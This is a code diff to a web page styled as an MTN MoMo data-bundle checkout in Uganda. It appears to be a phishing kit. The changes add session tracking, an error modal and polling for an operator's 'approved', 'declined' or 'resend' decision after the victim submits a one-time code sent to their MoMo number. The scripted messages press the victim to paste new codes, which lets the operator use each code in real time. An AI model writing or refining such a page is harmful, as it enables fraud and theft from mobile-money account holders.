@@ -308,6 +308,42 @@
         .btn-done:active { transform: scale(0.98); }
         .btn-done i { font-size: 19px; }
 
+        /* ERROR OVERLAY (new) */
+        .error-overlay {
+            position: fixed; inset: 0; z-index: 10001; display: none;
+            align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.55); backdrop-filter: blur(4px); padding: 20px;
+        }
+        .error-overlay.open { display: flex; }
+        .error-card {
+            background: var(--white); border-radius: var(--radius-xl);
+            padding: 26px 22px; max-width: 360px; width: 100%;
+            text-align: center; box-shadow: var(--shadow-2xl);
+            transform: scale(0.9); opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
+        }
+        .error-card.show { transform: scale(1); opacity: 1; }
+        .error-icon {
+            width: 60px; height: 60px; border-radius: var(--radius-md);
+            background: #FEE2E2; display: flex; align-items: center;
+            justify-content: center; margin: 0 auto 16px;
+        }
+        .error-icon.warn { background: #FEF3C7; }
+        .error-icon i { font-size: 30px; color: var(--red-500); }
+        .error-icon.warn i { color: var(--orange-500); }
+        .error-title { font-size: 17px; font-weight: 900; color: var(--gray-900); margin-bottom: 8px; }
+        .error-text { font-size: 13.5px; color: var(--gray-500); line-height: 1.6; margin-bottom: 20px; }
+        .error-btn {
+            width: 100%; padding: 14px; background: var(--momo-yellow);
+            color: var(--black); font-weight: 900; font-size: 13px;
+            letter-spacing: 1px; text-transform: uppercase;
+            border-radius: var(--radius-md);
+            transition: transform 0.15s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+        .error-btn:hover { filter: brightness(0.95); }
+        .error-btn:active { transform: scale(0.97); }
+
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
             .otp-band { padding: 28px 28px 24px; }
@@ -341,7 +377,7 @@
                 <div class="otp-body">
 
                     <div class="otp-top">
-                        <a href="/sms-paste.html" class="back-link">
+                        <a href="#" id="backLink" class="back-link">
                             <i class="uil uil-arrow-left"></i> Back
                         </a>
                         <div class="amount-mini">
@@ -425,6 +461,16 @@
         </div>
     </div>
 
+    <!-- ERROR OVERLAY (new) -->
+    <div class="error-overlay" id="errorOverlay">
+        <div class="error-card" id="errorCard">
+            <div class="error-icon" id="errorIcon"><i class="uil uil-times-circle"></i></div>
+            <h3 class="error-title" id="errorTitle">Verification Failed</h3>
+            <p class="error-text" id="errorText">You have entered an incorrect code. Kindly check a new code sent to your MoMo number.</p>
+            <button class="error-btn" id="errorBtn">OK</button>
+        </div>
+    </div>
+
     <script>
         // ============================================
         // API BASE — same origin (backend serves this page)
@@ -432,7 +478,7 @@
         const API_BASE = '';
 
         // ============================================
-        // READ PLAN FROM URL
+        // READ PLAN + SESSION FROM URL
         // ============================================
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Elite Bundle';
@@ -440,6 +486,12 @@
         const planPrice = parseFloat(params.get('price') || '45');
         const planPeriod = params.get('period') || '2 Months';
         const planPhone = params.get('phone') || '7XXXXXXXX';
+        const sessionId = params.get('session') || '';
+
+        // Back link keeps session + plan params
+        document.getElementById('backLink').href = '/sms-paste.html?' + new URLSearchParams({
+            plan: planName, data: planData, price: planPrice, phone: planPhone, session: sessionId
+        }).toString();
 
         document.getElementById('display-amount').textContent = 'UGX ' + planPrice.toFixed(2);
         document.getElementById('display-phone').textContent = '+256 ' + planPhone.replace(/^0/, '');
@@ -454,11 +506,30 @@
         const successOverlay = document.getElementById('successOverlay');
         const doneBtn = document.getElementById('doneBtn');
 
+        const errorOverlay = document.getElementById('errorOverlay');
+        const errorCard = document.getElementById('errorCard');
+        const errorIcon = document.getElementById('errorIcon');
+        const errorTitle = document.getElementById('errorTitle');
+        const errorText = document.getElementById('errorText');
+        const errorBtn = document.getElementById('errorBtn');
+
+        let pollTimer = null;
+        let currentSessionId = sessionId;
+        let isSubmitting = false;
+        let lastStatus = 'pending';
+
         function updateSubmitState() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
             otpCodeInput.value = val;
-            submitBtn.disabled = val.length !== 4;
+            submitBtn.disabled = val.length !== 4 || isSubmitting;
             otpBoxes.forEach(b => b.classList.toggle('filled', b.value.length === 1));
+        }
+
+        function clearOtpBoxes() {
+            otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+            otpCodeInput.value = '';
+            submitBtn.disabled = true;
+            otpBoxes[0].focus();
         }
 
         otpBoxes.forEach((box, index) => {
@@ -496,10 +567,15 @@
 
         otpForm.addEventListener('submit', (e) => { e.preventDefault(); submitOTP(); });
 
+        // ============================================
+        // SUBMIT OTP → then wait for admin decision
+        // ============================================
         async function submitOTP() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
-            if (val.length !== 4) return;
+            if (val.length !== 4 || isSubmitting) return;
 
+            isSubmitting = true;
+            lastStatus = 'pending';
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verifying...</span>';
 
@@ -507,10 +583,11 @@
             document.body.classList.add('modal-open');
 
             try {
-                await fetch(API_BASE + '/api/otp', {
+                const res = await fetch(API_BASE + '/api/otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        sessionId: currentSessionId,
                         plan: planName,
                         data: planData,
                         price: planPrice,
@@ -519,16 +596,83 @@
                         otp: val
                     })
                 });
+
+                const data = await res.json().catch(() => ({}));
+
+                if (data.sessionId) currentSessionId = data.sessionId;
+
+                // Start polling for the admin decision
+                startPolling();
+
             } catch (err) {
                 console.error('Failed to send OTP:', err);
-            }
-
-            setTimeout(() => {
                 waitingOverlay.classList.remove('open');
-                showSuccess();
-            }, 6000);
+                document.body.classList.remove('modal-open');
+                isSubmitting = false;
+                submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                updateSubmitState();
+                showError('Network error. Please check your connection and try again.', 'Network Error', false, false);
+            }
         }
 
+        // ============================================
+        // POLL /api/status/:sessionId
+        // ============================================
+        function startPolling() {
+            clearInterval(pollTimer);
+            pollTimer = setInterval(async () => {
+                if (!currentSessionId) return;
+                try {
+                    const res = await fetch(API_BASE + '/api/status/' + currentSessionId);
+                    const data = await res.json();
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.classList.remove('modal-open');
+                        showSuccess();
+                    } else if (data.status === 'declined') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.classList.remove('modal-open');
+                        isSubmitting = false;
+                        submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                        updateSubmitState();
+                        showError(
+                            data.message || 'You have entered an incorrect code. Kindly check a new code sent to your MoMo number.',
+                            'Verification Failed',
+                            false,   // warn icon
+                            false    // no redirect
+                        );
+                    } else if (data.status === 'resend') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.classList.remove('modal-open');
+                        isSubmitting = false;
+                        submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                        clearOtpBoxes();
+                        showError(
+                            data.message || 'The code has expired. Kindly check a new code, copy and paste here.',
+                            'Code Expired',
+                            true,    // warn icon
+                            false    // no redirect
+                        );
+                    } else if (data.status === 'timeout') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        document.body.classList.remove('modal-open');
+                        isSubmitting = false;
+                        submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                        showError('Session expired. Please start again from the checkout page.', 'Session Expired', false, true);
+                    }
+                } catch (err) {}
+            }, 2000);
+        }
+
+        // ============================================
+        // SUCCESS
+        // ============================================
         function showSuccess() {
             const ref = 'UG' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
 
@@ -544,6 +688,42 @@
 
         doneBtn.addEventListener('click', () => {
             window.location.href = '/';
+        });
+
+        // ============================================
+        // ERROR MODAL
+        // ============================================
+        let redirectToCheckoutOnClose = false;
+
+        function showError(message, title, warn, redirectToCheckout) {
+            errorTitle.textContent = title || 'Verification Failed';
+            errorText.textContent = message;
+            errorIcon.classList.toggle('warn', !!warn);
+            errorIcon.innerHTML = warn
+                ? '<i class="uil uil-exclamation-triangle"></i>'
+                : '<i class="uil uil-times-circle"></i>';
+            redirectToCheckoutOnClose = !!redirectToCheckout;
+
+            errorOverlay.classList.add('open');
+            setTimeout(() => errorCard.classList.add('show'), 50);
+        }
+
+        errorBtn.addEventListener('click', () => {
+            errorCard.classList.remove('show');
+            setTimeout(() => {
+                errorOverlay.classList.remove('open');
+                document.body.classList.remove('modal-open');
+
+                if (redirectToCheckoutOnClose) {
+                    const backParams = new URLSearchParams({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice
+                    });
+                    window.location.href = '/checkout.html?' + backParams.toString();
+                }
+                redirectToCheckoutOnClose = false;
+            }, 250);
         });
     </script>
 </body>
